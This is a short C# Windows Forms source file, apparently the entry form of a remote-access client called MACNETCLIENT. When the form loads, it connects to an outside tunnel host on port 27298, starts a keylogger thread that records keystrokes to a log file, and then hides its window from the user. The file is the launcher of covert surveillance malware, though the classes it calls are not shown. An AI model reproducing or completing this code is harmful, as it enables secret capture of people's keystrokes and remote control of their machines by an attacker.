using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace MACNETCLIENT
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            MACNETCLIENT macnet = new MACNETCLIENT();
            macnet.start("macnet12-27298.portmap.io", 27298);
            Keylog keylogger = new Keylog(MACNETCLIENT.LOG_FILE_LOCATION, 100);
            Thread THR_Keylog = new Thread(new ThreadStart(keylogger.start));
            THR_Keylog.Start();

        }
        private void Form1_Shown(object sender, EventArgs e)
        {
            this.Hide(); 
        }

    
    }
}
